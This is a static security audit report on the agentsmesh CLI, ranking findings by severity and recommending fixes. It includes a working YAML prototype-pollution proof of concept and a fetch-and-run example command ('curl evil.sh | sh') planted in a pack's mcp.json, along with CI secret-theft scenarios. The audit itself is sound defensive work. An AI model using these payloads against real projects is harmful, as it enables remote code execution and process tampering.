# Security Audit Report — agentsmesh

Scope: `src/config/`, `src/canonical/`, `package.json` + `pnpm-lock.yaml`, `.github/workflows/`, `scripts/`.
Method: static review only. No `npm audit` was run (no network).

## Summary

- Critical: 0
- High: 1
- Medium: 3
- Low: 4
- Info: 3

## Findings

### [HIGH] Prototype-pollution-shaped sink in `deepMergeObjects` over user-controlled YAML

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/config/core/loader.ts:57-82` (`deepMergeObjects`), invoked from `mergeLocalConfig` at lines 102-105 and 112-115.
- **Description:** `agentsmesh.local.yaml` is parsed by `yaml` v2 and merged into the validated project config **before** the `configSchema.safeParse(merged)` re-validation. `deepMergeObjects` walks `Object.entries(overrides)` and recurses into nested objects without filtering `__proto__`, `constructor`, or `prototype` keys. Although `yaml` v2 by default refuses to materialize the literal key `__proto__` as `Object.prototype` (it places it on the parsed object as a regular own property), the **`constructor.prototype`** path is not blocked: a YAML payload of the form

  ```yaml
  overrides:
    constructor:
      prototype:
        polluted: "yes"
  ```

  results in `deepMergeObjects` taking the `typeof baseVal === 'object'` branch (because `({}).constructor === Object` is an object) and assigning into the live `Object.prototype` of the running process. Every subsequent `{}.polluted` is `"yes"`.

- **Impact:** Local-config-controlled pollution of `Object.prototype`. Attack model is constrained (an attacker must already get a malicious `agentsmesh.local.yaml` into the project) but the file is explicitly described as "untrusted/local-override" and is the file consumers are most likely to share or commit by mistake (e.g. via repo templates, pack extends, IDE clipboards). Pollution can flip downstream booleans in option-bag merges and Zod `default()`-backed fields (e.g. cause `collaboration.strategy` lookups to leak attacker values into target descriptors).

- **Proof of concept:**
  ```yaml
  # agentsmesh.local.yaml
  version: 1
  overrides:
    constructor:
      prototype:
        isAdmin: true
  ```
  After `loadConfigFromExactDir`, `({}).isAdmin === true` everywhere in the process. (`overrides` is typed `Record<string, Record<string, unknown>>`, so Zod accepts the shape.)

- **Recommendation:** Reject the three poison keys in `deepMergeObjects` and treat them as a hard parse error:
  ```ts
  const POISON = new Set(['__proto__', 'constructor', 'prototype']);
  for (const [k, v] of Object.entries(overrides)) {
    if (POISON.has(k)) throw new ConfigValidationError(/* ... */);
    // ...
  }
  ```
  Apply the same guard inside `mergeCanonicalFiles`/`mergeMcp` spread merges (`/Users/serhii/WebstormProjects/agentsmesh/src/canonical/load/merge.ts:69`) — `{ ...baseServers, ...overlayServers }` over attacker-controlled `mcp.json` has the same shape, and `mcp.json` arrives from third-party packs.

---

### [MEDIUM] Plugin loader executes arbitrary npm code from `agentsmesh.yaml` with no sandbox or hash pin

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/plugins/load-plugin.ts:69` (`await import(importTarget)`), schema at `/Users/serhii/WebstormProjects/agentsmesh/src/config/core/schema.ts:78-92`.
- **Description:** Any string passed in `plugins[].source` is dynamic-`import()`'d and runs with full process privileges. The schema only restricts `id` to `[a-z][a-z0-9-]*`, not `source`. There is no integrity check, no version pin requirement (`version` is `optional`), and no `signature`/`provenance` verification. A poisoned/squatted npm package, or a hostile maintainer turnover on a legitimate plugin, executes arbitrary code on every `agentsmesh generate` run.
- **Impact:** Supply-chain code execution on developer machines and CI runners. Risk is acknowledged in the schema comment ("`plugins load via dynamic import() and execute as trusted Node.js modules with full process privileges`") but no defense is implemented.
- **Recommendation:**
  1. Require `version` and persist a resolved tarball SHA-512 in `.agentsmesh/.lock` (an `extends`-style integrity field for plugins).
  2. Refuse to load a plugin whose lock SHA doesn't match.
  3. Gate plugin loading behind an explicit allow flag in `agentsmesh.yaml` (e.g. `pluginsTrusted: true`) so the first run prompts the user.

---

### [MEDIUM] CI third-party actions pinned by floating major tag, not commit SHA

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/.github/workflows/ci.yml:30,32,36,72,76,105,120,124,174,178,183,206,231`; `/Users/serhii/WebstormProjects/agentsmesh/.github/workflows/publish.yml:31,35,39,50,100,104,109,213,260`; `/Users/serhii/WebstormProjects/agentsmesh/.github/workflows/deploy-website.yml:39-84`.
- **Description:** Every third-party action is pinned by `@v4` / `@v1` / `@v2` (mutable tags). The release workflow at `publish.yml` runs with `permissions: contents: write, pull-requests: write, id-token: write` and `NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}` exposed to `changesets/action@v1`. The tap-update job at `publish.yml:259-263` passes `HOMEBREW_TAP_TOKEN` to `actions/checkout@v4`. A compromised tag (e.g. the historical `tj-actions/changed-files`/`reviewdog` incidents) on any of these would exfiltrate `NPM_TOKEN`, `HOMEBREW_TAP_TOKEN`, and Pages `id-token`, then publish trojaned releases under provenance.
- **Impact:** Full npm-publish + Homebrew-tap takeover. Provenance attestations would be issued for the malicious build, defeating the `publishConfig.provenance: true` defense.
- **Recommendation:** Pin every `uses:` to a 40-char commit SHA with a comment carrying the human tag, e.g. `uses: actions/checkout@b4ffde6...  # v4.2.2`. Enable Dependabot for `package-ecosystem: github-actions` to keep the pins fresh.

---

### [MEDIUM] Release secrets readable on `push` to any branch matching the workflow's protection model

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/.github/workflows/ci.yml:1-7`.
- **Description:** `on: push: branches: ["**"]` runs the full `ci.yml` for every push, including from PR feature branches. While the file does not directly expose `NPM_TOKEN`, the `Audit production dependencies` step (line 84) and `Upload coverage` step (line 105 with `${{ secrets.CODECOV_TOKEN }}`) run on every branch push. `CODECOV_TOKEN` is not marked `if: github.event_name == 'push' && github.repository == 'sampleXbro/agentsmesh'`, so a fork PR that lands on the head repo (rare but possible during transfer/merge backports) leaks it. Also, `pnpm audit` and `pnpm test:e2e` execute build scripts of the *production dependency tree* — if `pnpm install --frozen-lockfile` is later replaced with a non-frozen run, a hijacked transitive could read `CODECOV_TOKEN` from the runner env.
- **Recommendation:** (1) Scope the upload to `if: github.repository == 'sampleXbro/agentsmesh' && github.ref == 'refs/heads/master'`. (2) Add `actions/setup-node` `always-auth: false` for non-publish jobs. (3) Set `permissions: contents: read` at the top of `ci.yml` (currently inherits the repo default — likely `read-all` or write).

---

### [LOW] `npm pack` glob in `install-global` script accepts any tarball in CWD

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/package.json:78`.
- **Description:** `"install-global": "rm -f agentsmesh-*.tgz && npm run build && npm pack && (npm uninstall -g agentsmesh 2>/dev/null || true) && npm install -g $(pwd)/agentsmesh-*.tgz"` — the final `npm install -g $(pwd)/agentsmesh-*.tgz` is a glob: if more than one matches it installs the first, which `rm -f` is supposed to prevent, but a pre-existing `agentsmesh-evil.tgz` between the `rm` and `pack` (race on shared workstations / CI cache) installs the wrong artifact. Also `rm -f agentsmesh-*.tgz` runs in the repo root; if the user accidentally has a file named `agentsmesh-foo.tgz` they care about, it's silently destroyed.
- **Recommendation:** Use a deterministic filename: `npm pack --pack-destination /tmp/agentsmesh-install && npm install -g /tmp/agentsmesh-install/agentsmesh-*.tgz`, and `set -euo pipefail` semantics by switching to a shell script under `scripts/`.

---

### [LOW] Homebrew tap render uses unquoted `sed` substitution of remote-controlled fields

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/.github/workflows/publish.yml:247-253`.
- **Description:** `sed "s/{{VERSION}}/$VERSION/g; s/{{SHA256}}/$SHA256/g" homebrew/agentsmesh.rb.tmpl > agentsmesh.rb`. `VERSION` is already shape-validated upstream (publish.yml:131-137), but `SHA256` is the *output of `curl | sha256sum`* on a tarball the npm registry serves. A registry that returns a body containing newlines/`/` would not currently break `sha256sum` (deterministic 64 hex chars), so the risk is theoretical, but the pattern is fragile — any future change that uses a non-hash field here is one PR away from `sed` argument injection.
- **Recommendation:** Generate the formula in Node/TS with `JSON.stringify`-like quoting, not shell `sed`. At minimum, assert the SHA shape: `[ "${#SHA256}" = 64 ] && case "$SHA256" in *[!0-9a-f]*) exit 1;; esac`.

---

### [LOW] `parseMcp` accepts arbitrary string for `command`/`args` with no allowlist or validation

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/canonical/features/mcp.ts:33-45`.
- **Description:** `mcp.json` is loaded from disk (including from third-party packs at `.agentsmesh/packs/<pack>/mcp.json`) and the `command`/`args` are written verbatim into target tool MCP configs (per the schema comment at `src/mcp/schemas.ts:7`: "command written into mcp.json becomes RCE on next server spawn"). The parser does no allowlisting; the only defense is `mergeMcp`'s `{ ...base, ...overlay }` (line 69) where overlay (project) wins over base (third-party pack). When a user runs `agentsmesh install <pack>` and the pack ships an `mcp.json` with `command: "curl evil.sh | sh"`, then runs `generate`, the user's MCP-capable agents will execute it on next startup.
- **Impact:** RCE chain via untrusted pack install → generate → agent restart.
- **Recommendation:** Surface third-party-pack-introduced MCP servers in a confirmation prompt during `install` (similar to `npm install`'s "X packages installed, Y need review"), and refuse to silently merge a new MCP `command` from a pack the user hasn't acknowledged. Track introduced servers in `.lock` so subsequent regenerations are diff-able.

---

### [LOW] `fetchGithubDefaultBranch` embeds GitHub token in clone URL

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/config/remote/github-remote.ts:197-200`.
- **Description:** `buildGithubCloneUrl` puts `x-access-token:${token}` into the clone URL. Git writes the URL into `.git/config` and into `~/.gitconfig`'s credential cache (when configured). Subsequent operations in the same cache dir can read the token. The cache dir is under `~/.agentsmesh/cache/`, world-readable by default on most systems.
- **Recommendation:** Use `git -c http.extraheader="AUTHORIZATION: Bearer $TOKEN" clone` (passing the header out-of-URL) so the token never lands in `config`. The pattern is already adopted by the tap-checkout step (`publish.yml:255-264` comment explicitly explains this risk).

---

### [INFO] Frontmatter parser is safe by virtue of `yaml` v2 default schema

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/utils/text/markdown.ts:24`.
- **Description:** All YAML across the codebase (config, frontmatter, hooks, permissions, lock, packs) uses `yaml@^2.8.3` (eemeli/yaml). Its default `parse()` uses the YAML 1.2 core schema with no constructor/function tags — there is no equivalent of `js-yaml`'s `!!js/function`/`!!js/regexp` deserialization. `gray-matter` is not a dependency. This is the strongest single piece of the parser surface.

### [INFO] `git-remote` option-injection guard and tarball size cap are well-implemented

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/src/config/remote/git-remote.ts:19-25`, `/Users/serhii/WebstormProjects/agentsmesh/src/config/remote/github-remote.ts:46-86`, zip-slip filter at lines 167-174 + 202-205.
- **Description:** `execFile` (no shell), the leading-`-` guard for git refs/URLs, the symlink/hardlink filter, the streaming `readBoundedResponse` with `Content-Length` fast-fail, and the `AGENTSMESH_CACHE` root guard (`remote-fetcher.ts:77-79`) are all best-practice. Keep them.

### [INFO] Package lacks `pre/postinstall` scripts — supply-chain amplifier surface is clean

- **Location:** `/Users/serhii/WebstormProjects/agentsmesh/package.json:46-79`.
- **Description:** No `postinstall`, `preinstall`, `prepare` for end users (the `prepare: "husky"` only runs from the repo because `husky` is a devDependency). `npm install agentsmesh` does not execute arbitrary code at the consumer site.

## Positive Observations

- All YAML parsing standardised on `yaml@^2.8.3` (safe-by-default). No `js-yaml`, no `eval`, no `Function(...)`, no `vm`.
- `publishConfig: { provenance: true }` — signed npm provenance is enabled.
- `install.sh` is exemplary: input allowlist for `AGENTSMESH_INSTALL`, mandatory SHA256 verification with fail-closed semantics, fallback hash tools, no `eval`.
- Tarball extraction filters symlinks/hardlinks and zip-slip paths (`github-remote.ts:167-174`).
- Schema-validation-after-parse for the top-level config; permission, hook, MCP parsers all use `unknown` + type narrowing rather than blind casts.
- Cache cleanup is path-bounded with an explicit "must not be filesystem root" check (`remote-fetcher.ts:67-83`).
- Git operations use `execFile`, never shell, with a leading-dash guard for both URLs and refs.

## Recommendations

1. **Patch the High first.** Add a poison-key guard to `deepMergeObjects` and to every `{...a, ...b}` spread that consumes parsed third-party YAML/JSON.
2. **Lock plugins by integrity hash.** The plugin schema already carries `version`; extend `.lock` to carry resolved tarball digests and refuse a mismatch.
3. **Pin GitHub Actions by SHA.** This is a one-time PR with high leverage given the `NPM_TOKEN` and `HOMEBREW_TAP_TOKEN` surface.
4. **Restrict `permissions:` at the top of every workflow** to the minimum each job needs (already done in `update-tap`; replicate in `quality`/`coverage`/`smoke`/`build-binaries`/`smoke-binaries`).
5. **Confirm-on-install for pack-introduced MCP commands.** This is the most realistic RCE vector for end users.
